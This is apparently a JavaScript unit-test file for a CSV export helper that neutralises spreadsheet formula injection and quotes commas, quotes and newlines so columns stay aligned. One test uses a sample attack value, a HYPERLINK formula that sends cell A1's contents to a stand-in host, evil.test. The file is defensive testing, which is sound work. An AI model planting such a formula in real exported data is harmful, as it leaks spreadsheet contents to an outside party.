// Writing a CSV that a spreadsheet will not execute.
//
// Tested here rather than only through a route, because the routes have
// validators in front of them that refuse the nastiest values before they
// can be stored. That is the layer before this one working, and it is not
// the same as this layer working: a list imported by hand, a field that is
// not an address, or a validator relaxed later all arrive here directly.
import { test } from "node:test";
import assert from "node:assert/strict";

const { safeCell, csvRow, csvFile } = await import("../src/csv.js");

test("the four characters a spreadsheet reads as a formula are defused", () => {
  // A leading apostrophe is how spreadsheets are told "this is text". It is
  // not shown in the cell and survives a round trip.
  assert.equal(safeCell("=1+1"), "'=1+1");
  assert.equal(safeCell("+1"), "'+1");
  assert.equal(safeCell("-1"), "'-1");
  assert.equal(safeCell("@SUM(A1)"), "'@SUM(A1)");
});

test("the attack this exists for", () => {
  const nasty = '=HYPERLINK("http://evil.test/"&A1,"Click me")';
  const cell = safeCell(nasty);

  assert.ok(cell.startsWith(`"'=`), "defused and quoted");
  // Quoting is a separate job from the formula guard: this value holds a
  // comma, and an unquoted comma would end the cell and shift every column
  // after it.
  assert.ok(cell.includes('""Click me""'), "inner quotes doubled");
});

test("a tab or a carriage return at the front counts too", () => {
  // Both are stripped by some spreadsheets before parsing, which would
  // uncover the formula character hiding behind them.
  //
  // The tab is guarded but not quoted, and that is right: quoting is for
  // characters that would end the cell early, and a tab is not one of them
  // in a comma separated file. The carriage return is both, because it
  // would.
  assert.equal(safeCell("\t=1+1"), "'\t=1+1");
  assert.equal(safeCell("\r=1+1"), '"\'\r=1+1"');
});

test("an ordinary address is left exactly as it is", () => {
  assert.equal(safeCell("reader@example.com"), "reader@example.com");
  assert.equal(safeCell("first.last+tag@example.co.uk"), "first.last+tag@example.co.uk");
});

test("a formula character in the middle is not a formula", () => {
  // Only a leading one is read as one, and guarding more than necessary
  // would put apostrophes into ordinary data.
  assert.equal(safeCell("a=b"), "a=b");
  assert.equal(safeCell("one-two"), "one-two");
});

test("commas, quotes and newlines are quoted so columns do not shift", () => {
  assert.equal(safeCell("Smith, John"), '"Smith, John"');
  assert.equal(safeCell('He said "hi"'), '"He said ""hi"""');
  assert.equal(safeCell("two\nlines"), '"two\nlines"');
});

test("nothing is written as nothing, not as the word undefined", () => {
  assert.equal(safeCell(null), "");
  assert.equal(safeCell(undefined), "");
  assert.equal(safeCell(""), "");
  assert.equal(safeCell(0), "0");
});

test("a row is its cells, each one guarded", () => {
  assert.equal(csvRow(["ok@example.com", "=2+2", "plain"]), "ok@example.com,'=2+2,plain");
});

test("a file is CRLF, which is what the format says and what Excel expects", () => {
  const file = csvFile(["email", "joined"], [["a@example.com", "2026-01-01"]]);

  assert.equal(file, "email,joined\r\na@example.com,2026-01-01");
});

test("a file with no rows is still a file with a header", () => {
  assert.equal(csvFile(["email", "joined"], []), "email,joined");
});

test("a header is guarded the same way the rows are", () => {
  // Headers are usually ours and safe. Usually is not a guarantee worth
  // writing a second code path for.
  assert.equal(csvFile(["=email"], []), "'=email");
});
